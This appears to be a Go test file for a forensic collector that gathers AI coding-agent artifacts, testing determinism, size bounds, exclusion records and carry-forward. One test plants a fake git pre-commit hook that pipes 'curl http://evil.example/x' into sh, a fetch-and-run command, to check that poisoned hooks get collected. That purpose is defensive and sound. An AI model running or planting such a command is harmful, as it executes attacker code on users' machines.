package collector

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/efij/AgentDFIR/v2/internal/casepkg"
	"github.com/efij/AgentDFIR/v2/internal/products"
)

// collectInto runs a collection over root with the given options and
// returns the sealed package path.
func collectInto(t *testing.T, root string, opts Options) (string, *Stats) {
	t.Helper()
	man, err := products.Manifest("claude-code")
	if err != nil {
		t.Fatal(err)
	}
	pkg := filepath.Join(t.TempDir(), "case.adfir")
	b, err := casepkg.New(pkg, "TEST-PAR", casepkg.CaseInfo{OperatorOSUser: "tester"})
	if err != nil {
		t.Fatal(err)
	}
	opts.ProfileRoot = root
	opts.ConfigRoot = filepath.Join(root, ".claude")
	opts.SystemRoot = root
	opts.Product = "claude-code"
	st, err := Run(b, man, opts)
	if err != nil {
		t.Fatal(err)
	}
	if err := b.Seal(); err != nil {
		t.Fatal(err)
	}
	return pkg, st
}

// manifestShape reduces a package to what must not vary between runs.
func manifestShape(t *testing.T, pkg string) []string {
	t.Helper()
	man, err := casepkg.ReadManifest(pkg)
	if err != nil {
		t.Fatal(err)
	}
	out := make([]string, 0, len(man.Artifacts))
	for _, a := range man.Artifacts {
		out = append(out, fmt.Sprintf("%s|%s|%s|%d", a.LogicalPath, a.Status, a.ArtifactID, a.Size))
	}
	return out
}

// TestParallelCollectionIsDeterministic is the property that makes a
// worker pool acceptable in a forensic tool: what gets collected, and the
// order it is recorded in, must not depend on how the workers interleaved.
func TestParallelCollectionIsDeterministic(t *testing.T) {
	root := t.TempDir()
	proj := filepath.Join(root, ".claude", "projects", "-repo")
	if err := os.MkdirAll(proj, 0o755); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 60; i++ {
		content := strings.Repeat(fmt.Sprintf(`{"i":%d,"pad":"xxxxxxxxxxxxxxxx"}`+"\n", i), 40)
		if err := os.WriteFile(filepath.Join(proj, fmt.Sprintf("s%02d.jsonl", i)), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(root, ".claude.json"), []byte(`{"mcpServers":{}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	serialPkg, serialStats := collectInto(t, root, Options{Jobs: 1})
	parallelPkg, parallelStats := collectInto(t, root, Options{Jobs: 8})

	serial, parallel := manifestShape(t, serialPkg), manifestShape(t, parallelPkg)
	if len(serial) != len(parallel) {
		t.Fatalf("record count differs: serial %d, parallel %d", len(serial), len(parallel))
	}
	for i := range serial {
		if serial[i] != parallel[i] {
			t.Fatalf("record %d differs between a serial and a parallel run:\n  serial:   %s\n  parallel: %s", i, serial[i], parallel[i])
		}
	}
	if serialStats.Acquired != parallelStats.Acquired || serialStats.TotalBytes != parallelStats.TotalBytes {
		t.Fatalf("stats differ: serial %+v, parallel %+v", *serialStats, *parallelStats)
	}
	if res, err := casepkg.Verify(parallelPkg); err != nil || len(res.Problems) != 0 {
		t.Fatalf("parallel package does not verify: %v %v", err, res.Problems)
	}
}

// TestTotalBoundIsDeterministicUnderParallelism: which files a package
// bound excludes must be decided in discovery order, not by whichever
// worker got there first.
func TestTotalBoundIsDeterministicUnderParallelism(t *testing.T) {
	root := t.TempDir()
	proj := filepath.Join(root, ".claude", "projects", "-repo")
	if err := os.MkdirAll(proj, 0o755); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 40; i++ {
		if err := os.WriteFile(filepath.Join(proj, fmt.Sprintf("s%02d.jsonl", i)),
			[]byte(strings.Repeat("A", 4096)), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// A bound that cuts the set in the middle.
	opts := Options{MaxTotalBytes: 20 * 4096}
	a, _ := collectInto(t, root, opts)
	opts.Jobs = 8
	b, _ := collectInto(t, root, opts)
	sa, sb := manifestShape(t, a), manifestShape(t, b)
	if len(sa) != len(sb) {
		t.Fatalf("record count differs under a bound: %d vs %d", len(sa), len(sb))
	}
	for i := range sa {
		if sa[i] != sb[i] {
			t.Fatalf("bound excluded different files across runs at %d:\n  %s\n  %s", i, sa[i], sb[i])
		}
	}
}

// TestExcludedSubtreeIsRecordedNotDropped: skipping vendored dependencies
// saves hundreds of megabytes, but evidence that was never collected
// cannot be examined later — so the exclusion has to be visible.
func TestExcludedSubtreeIsRecordedNotDropped(t *testing.T) {
	root := t.TempDir()
	plugins := filepath.Join(root, ".claude", "plugins", "somepack")
	nm := filepath.Join(plugins, "node_modules", "dep")
	if err := os.MkdirAll(nm, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(plugins, "plugin.json"), []byte(`{"name":"p"}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(nm, "index.js"), []byte(strings.Repeat("x", 5000)), 0o644); err != nil {
		t.Fatal(err)
	}

	pkg, _ := collectInto(t, root, Options{})
	man, err := casepkg.ReadManifest(pkg)
	if err != nil {
		t.Fatal(err)
	}
	var excluded, collectedDep bool
	for _, a := range man.Artifacts {
		if a.Status == casepkg.StatusSkippedPolicy && strings.Contains(a.LogicalPath, "node_modules") {
			excluded = true
			if !strings.Contains(a.Error, "1 file(s)") {
				t.Errorf("policy record does not say what was left out: %q", a.Error)
			}
		}
		if strings.Contains(a.LogicalPath, "node_modules/dep/index.js") && a.Status == casepkg.StatusOK {
			collectedDep = true
		}
	}
	if !excluded {
		t.Error("excluded subtree left no manifest record — the exclusion is invisible to an analyst")
	}
	if collectedDep {
		t.Error("node_modules content collected despite the default policy")
	}

	// --full-plugins must bring it back.
	pkg2, _ := collectInto(t, root, Options{FullContent: true})
	man2, err := casepkg.ReadManifest(pkg2)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, a := range man2.Artifacts {
		if strings.Contains(a.LogicalPath, "node_modules/dep/index.js") && a.Status == casepkg.StatusOK {
			found = true
		}
	}
	if !found {
		t.Error("--full-plugins did not collect the excluded subtree")
	}
}

// TestSecondRoundCarriesForwardUnchangedFiles exercises the collector end
// to end: a repeat collection must not re-read what it already holds.
func TestSecondRoundCarriesForwardUnchangedFiles(t *testing.T) {
	if !casepkg.SupportsCarryForward() {
		t.Skip("carry-forward needs a trustworthy change time; this platform re-reads instead")
	}
	root := fixtureProfile(t)
	man, err := products.Manifest("claude-code")
	if err != nil {
		t.Fatal(err)
	}
	pkg := filepath.Join(t.TempDir(), "case.adfir")
	opts := Options{
		ProfileRoot: root, ConfigRoot: filepath.Join(root, ".claude"), SystemRoot: root,
		Product: "claude-code", MaxFileBytes: 1024,
	}
	b, err := casepkg.New(pkg, "TEST-ROUND1", casepkg.CaseInfo{OperatorOSUser: "tester"})
	if err != nil {
		t.Fatal(err)
	}
	first, err := Run(b, man, opts)
	if err != nil {
		t.Fatal(err)
	}
	if err := b.Seal(); err != nil {
		t.Fatal(err)
	}
	if first.Acquired == 0 {
		t.Fatal("first round acquired nothing")
	}

	b2, err := casepkg.Reopen(pkg, casepkg.CaseInfo{OperatorOSUser: "tester"})
	if err != nil {
		t.Fatal(err)
	}
	second, err := Run(b2, man, opts)
	if err != nil {
		t.Fatal(err)
	}
	roundStats := b2.Stats()
	if err := b2.Seal(); err != nil {
		t.Fatal(err)
	}
	if second.Carried != first.Acquired {
		t.Fatalf("carried forward %d of %d unchanged artifacts", second.Carried, first.Acquired)
	}
	if second.Acquired != 0 {
		t.Fatalf("re-read %d unchanged files on the second round", second.Acquired)
	}
	if roundStats.StoredBytes != 0 {
		t.Fatalf("second round wrote %d bytes for evidence it already held", roundStats.StoredBytes)
	}
	if res, err := casepkg.Verify(pkg); err != nil || len(res.Problems) != 0 {
		t.Fatalf("package does not verify after two rounds: %v %v", err, res.Problems)
	}
}

// TestAbsentManifestPathsAreRecorded: "we looked here and it was not there"
// is a fact about the host. Warp AI was detected on a real machine and
// collected zero artifacts with no record of what had been checked, which
// left no way to tell a product that stores nothing from a collector aimed
// at the wrong path.
func TestAbsentManifestPathsAreRecorded(t *testing.T) {
	root := t.TempDir() // an empty profile: every manifest path is absent
	pkg, st := collectInto(t, root, Options{})
	if st.NotPresent == 0 {
		t.Fatal("no NOT_PRESENT records for a profile where nothing exists")
	}
	man, err := casepkg.ReadManifest(pkg)
	if err != nil {
		t.Fatal(err)
	}
	found := 0
	for _, a := range man.Current() {
		if a.Status == casepkg.StatusNotPresent {
			found++
			if a.SourcePath == "" {
				t.Error("NOT_PRESENT record does not say which path was checked")
			}
		}
	}
	if found == 0 {
		t.Fatal("NOT_PRESENT records missing from the manifest")
	}
	// Absence is not an acquisition failure.
	if st.Failed != 0 {
		t.Errorf("absent paths counted as %d failures", st.Failed)
	}
	if res, err := casepkg.Verify(pkg); err != nil || len(res.Problems) != 0 {
		t.Fatalf("package with absent-path records does not verify: %v %v", err, res.Problems)
	}
}

// TestGitHooksAreCollectedButObjectsAreNot: excluding the whole .git tree
// saved megabytes and also removed .git/hooks — the artifact a
// hook-installation detection has to read.
func TestGitHooksAreCollectedButObjectsAreNot(t *testing.T) {
	root := t.TempDir()
	repo := filepath.Join(root, ".claude", "plugins", "marketplaces", "pack")
	for _, d := range []string{
		filepath.Join(repo, ".git", "hooks"),
		filepath.Join(repo, ".git", "objects", "ab"),
	} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(repo, ".git", "hooks", "pre-commit"),
		[]byte("#!/bin/sh\ncurl http://evil.example/x | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".git", "config"), []byte("[core]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".git", "objects", "ab", "cdef"),
		[]byte(strings.Repeat("x", 4096)), 0o644); err != nil {
		t.Fatal(err)
	}

	pkg, _ := collectInto(t, root, Options{})
	man, err := casepkg.ReadManifest(pkg)
	if err != nil {
		t.Fatal(err)
	}
	var hook, config, object bool
	for _, a := range man.Current() {
		switch {
		case strings.HasSuffix(a.LogicalPath, ".git/hooks/pre-commit") && a.Status == casepkg.StatusOK:
			hook = true
		case strings.HasSuffix(a.LogicalPath, ".git/config") && a.Status == casepkg.StatusOK:
			config = true
		case strings.Contains(a.LogicalPath, ".git/objects/ab/cdef") && a.Status == casepkg.StatusOK:
			object = true
		}
	}
	if !hook {
		t.Error(".git/hooks/pre-commit not collected — a poisoned hook would be invisible")
	}
	if !config {
		t.Error(".git/config not collected")
	}
	if object {
		t.Error(".git/objects collected; that is the bulk the policy exists to skip")
	}
}
